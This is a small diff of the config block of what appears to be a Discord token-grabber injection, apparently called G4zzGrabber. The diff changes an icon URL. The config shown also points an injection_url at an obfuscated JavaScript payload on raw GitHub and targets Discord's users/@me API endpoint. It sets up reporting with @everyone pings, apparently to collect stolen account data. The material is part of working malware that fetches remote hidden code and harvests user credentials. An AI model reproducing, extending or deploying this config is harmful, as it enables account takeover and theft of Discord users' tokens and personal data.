@@ -12,8 +12,8 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Hacking Injection', 
-  embed_icon: 'https://github.com/g4zzlove/Hacking-injection/blob/main/imgs/pfp.png', 
-  embed_color: 0, 
+  embed_icon: 'https://github.com/g4zzlove/G4zzGrabber-injection/blob/main/imgs/pfp.png', 
+  embed_color: 0,  
   injection_url: 'https://raw.githubusercontent.com/g4zzlove/Hacking-injection/master/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
